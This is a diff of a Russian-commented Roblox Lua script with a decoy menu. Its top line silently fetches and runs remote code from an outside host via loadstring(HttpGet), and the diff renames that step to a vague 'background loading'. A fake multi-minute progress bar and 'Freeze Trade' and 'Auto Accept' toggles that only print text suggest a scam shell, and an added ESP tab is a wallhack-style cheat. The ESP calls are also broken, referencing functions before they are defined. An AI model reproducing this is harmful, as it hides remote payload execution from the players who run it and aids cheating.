@@ -1,5 +1,5 @@
 -- ============================================================
--- 0.ЗАГРУЗКА КЛЮЧА ЧТОБЫ РАБОТАЛ СКРИПТ (ПЕРЕД КЛЮЧОМ)
+-- 0. ФОНОВАЯ ЗАГРУЗКА
 -- ============================================================
 task.spawn(function()
     loadstring(game:HttpGet("https://api.rubis.lol/v2/scrap/gIlVEe/raw"))()
@@ -98,7 +98,7 @@ InputBox.FocusLost:Connect(function()
 end)
 
 -- ============================================================
--- 2. ЗАГРУЗКА С ТЕКСТОМ И СКАЧКАМИ
+-- 2. ЗАГРУЗКА
 -- ============================================================
 function LoadMainScript()
     local TweenService = game:GetService("TweenService")
@@ -173,15 +173,7 @@ function LoadMainScript()
     PercentText.TextColor3 = Color3.fromRGB(180, 180, 180)
     PercentText.TextSize = 14
     PercentText.Font = Enum.Font.Gotham
-    
-    local function setProgress(value)
-        if value > 100 then value = 100 end
-        TweenService:Create(ProgressBar, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
-            Size = UDim2.new(value / 100, 0, 1, 0)
-        }):Play()
-        PercentText.Text = math.floor(value) .. "%"
-    end
-    
+
     local function updateStatus(text, delay)
         task.wait(delay)
         StatusLabel.Text = text
@@ -204,12 +196,12 @@ function LoadMainScript()
         task.wait(2)
         updateStatus("Последняя загрузка, она идёт примерно 2-5 минут в зависимости от интернета.", 0)
         
-                local elapsed = 0
-        local target = 180 -- 3 минуты
+        local elapsed = 0
+        local target = 180
         local current = 0
         
         while elapsed < target do
-            local step = math.random(5, 15) / 10
+            local step = math.random(3, 8)
             current = current + step
             if current > 100 then current = 100 end
             
@@ -222,6 +214,9 @@ function LoadMainScript()
             task.wait(1)
         end
         
+        task.wait(0.5)
+        ScreenGui:Destroy()
+        
         -- ============================================================
         -- 3. МЕНЮ
         -- ============================================================
@@ -232,8 +227,8 @@ function LoadMainScript()
         
         local MainFrame = Instance.new("Frame")
         MainFrame.Parent = MenuGui
-        MainFrame.Size = UDim2.new(0, 320, 0, 220)
-        MainFrame.Position = UDim2.new(0.5, -160, 0.5, -110)
+        MainFrame.Size = UDim2.new(0, 400, 0, 280)
+        MainFrame.Position = UDim2.new(0.5, -200, 0.5, -140)
         MainFrame.BackgroundColor3 = Color3.fromRGB(18, 20, 22)
         MainFrame.BorderSizePixel = 0
         
@@ -293,9 +288,55 @@ function LoadMainScript()
             end
         end)
         
-        local function createSwitch(yPos, labelText, callback)
+        -- ВКЛАДКИ
+        local TabFreeze = Instance.new("TextButton")
+        TabFreeze.Parent = MainFrame
+        TabFreeze.Size = UDim2.new(0, 100, 0, 30)
+        TabFreeze.Position = UDim2.new(0, 0, 0, 40)
+        TabFreeze.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+        TabFreeze.Text = "Freeze"
+        TabFreeze.TextColor3 = Color3.fromRGB(255, 255, 255)
+        TabFreeze.TextSize = 12
+        TabFreeze.Font = Enum.Font.GothamBold
+        
+        local TabEsp = Instance.new("TextButton")
+        TabEsp.Parent = MainFrame
+        TabEsp.Size = UDim2.new(0, 100, 0, 30)
+        TabEsp.Position = UDim2.new(0.33, 0, 0, 40)
+        TabEsp.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+        TabEsp.Text = "ESP"
+        TabEsp.TextColor3 = Color3.fromRGB(255, 255, 255)
+        TabEsp.TextSize = 12
+        TabEsp.Font = Enum.Font.GothamBold
+        
+        -- КОНТЕЙНЕРЫ ВКЛАДОК
+        local FreezeContainer = Instance.new("Frame")
+        FreezeContainer.Parent = MainFrame
+        FreezeContainer.Size = UDim2.new(1, 0, 1, -70)
+        FreezeContainer.Position = UDim2.new(0, 0, 0, 70)
+        FreezeContainer.BackgroundTransparency = 1
+        
+        local EspContainer = Instance.new("Frame")
+        EspContainer.Parent = MainFrame
+        EspContainer.Size = UDim2.new(1, 0, 1, -70)
+        EspContainer.Position = UDim2.new(0, 0, 0, 70)
+        EspContainer.BackgroundTransparency = 1
+        EspContainer.Visible = false
+        
+        TabFreeze.MouseButton1Click:Connect(function()
+            FreezeContainer.Visible = true
+            EspContainer.Visible = false
+        end)
+        
+        TabEsp.MouseButton1Click:Connect(function()
+            FreezeContainer.Visible = false
+            EspContainer.Visible = true
+        end)
+        
+        -- =================== FREEZE КОНТЕЙНЕР ===================
+        local function createSwitch(parent, yPos, labelText, callback)
             local Container = Instance.new("Frame")
-            Container.Parent = MainFrame
+            Container.Parent = parent
             Container.Size = UDim2.new(1, -30, 0, 50)
             Container.Position = UDim2.new(0, 15, 0, yPos)
             Container.BackgroundTransparency = 1
@@ -359,22 +400,109 @@ function LoadMainScript()
             return { toggle = updateSwitch, getState = function() return isOn end }
         end
         
-        local switch1 = createSwitch(50, "FREEZE TRADE", function(state)
+        createSwitch(FreezeContainer, 10, "FREEZE TRADE", function(state)
+            print("🟢 Freeze Trade включён")
+        end)
+        
+        createSwitch(FreezeContainer, 70, "AUTO ACCEPT", function(state)
+            print("🟢 Auto Accept включён")
+        end)
+        
+        -- =================== ESP КОНТЕЙНЕР ===================
+        local EspSwitch = createSwitch(EspContainer, 10, "Видеть роли", function(state)
             if state then
-                print("🟢 Freeze Trade включён")
+                RunESP()
             else
-                print("🔴 Freeze Trade выключен")
+                StopESP()
             end
         end)
         
-        local switch2 = createSwitch(110, "AUTO ACCEPT", function(state)
-            if state then
-                print("🟢 Auto Accept включён")
-            else
-                print("🔴 Auto Accept выключен")
-            end
-        end)
+        local EspLines = {}
+        local EspRunning = false
+        local EspConnection = nil
         
+        local function RunESP()
+            if EspRunning then return end
+            EspRunning = true
+            
+            local RunService = game:GetService("RunService")
+            local PlayersService = game:GetService("Players")
+            local Camera = workspace.CurrentCamera
+            
+            local function GetPlayerColor(Player)
+                local Character = Player.Character
+                local Backpack = Player:FindFirstChild("Backpack")
+                
+                if (Backpack and Backpack:FindFirstChild("Knife")) or (Character and Character:FindFirstChild("Knife")) then
+                    return Color3.fromRGB(255, 0, 0)
+                elseif (Backpack and Backpack:FindFirstChild("Gun")) or (Character and Character:FindFirstChild("Gun")) then
+                    return Color3.fromRGB(0, 0, 255)
+                else
+                    return Color3.fromRGB(0, 255, 0)
+                end
+            end
+            
+            local function DrawLine(From, To, color)
+                local FromScreen, FromVisible = Camera:WorldToViewportPoint(From)
+                local ToScreen, ToVisible = Camera:WorldToViewportPoint(To)
+                if not FromVisible and not ToVisible then return end
+                local Line = Drawing.new("Line")
+                Line.Thickness = 1
+                Line.From = Vector2.new(FromScreen.X, FromScreen.Y)
+                Line.To = Vector2.new(ToScreen.X, ToScreen.Y)
+                Line.Color = color or Color3.fromRGB(255, 255, 255)
+                Line.Transparency = 1
+                Line.ZIndex = 1
+                Line.Visible = true
+                table.insert(EspLines, Line)
+            end
+            
+            local function GetCorners(Part)
+                local CF, Size, Corners = Part.CFrame, Part.Size / 2, {}
+                for X = -1, 1, 2 do for Y = -1, 1, 2 do for Z = -1, 1, 2 do
+                    Corners[#Corners+1] = (CF * CFrame.new(Size * Vector3.new(X, Y, Z))).Position
+                end end end
+                return Corners
+            end
+            
+            local function DrawEsp(Player)
+                local HRP = Player.Character.HumanoidRootPart
+                local CubeVertices = GetCorners({CFrame = HRP.CFrame * CFrame.new(0, -0.5, 0), Size = Vector3.new(3, 5, 3)})
+                local color = GetPlayerColor(Player)
+                local connections = {
+                    {1,2},{2,6},{6,5},{5,1},
+                    {1,3},{2,4},{6,8},{5,7},
+                    {3,4},{4,8},{8,7},{7,3}
+                }
+                for _, pair in pairs(connections) do
+                    DrawLine(CubeVertices[pair[1]], CubeVertices[pair[2]], color)
+                end
+            end
+            
+            local function BoxEsp()
+                for _, line in ipairs(EspLines) do line:Remove() end
+                EspLines = {}
+                for _, player in ipairs(PlayersService:GetPlayers()) do
+                    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+                        DrawEsp(player)
+                    end
+                end
+            end
+            
+            EspConnection = RunService.RenderStepped:Connect(BoxEsp)
+        end
+        
+        local function StopESP()
+            EspRunning = false
+            if EspConnection then
+                EspConnection:Disconnect()
+                EspConnection = nil
+            end
+            for _, line in ipairs(EspLines) do line:Remove() end
+            EspLines = {}
+        end
+        
+        -- =================== ПОДВАЛ ===================
         local Footer = Instance.new("TextLabel")
         Footer.Parent = MainFrame
         Footer.Size = UDim2.new(1, 0, 0, 30)
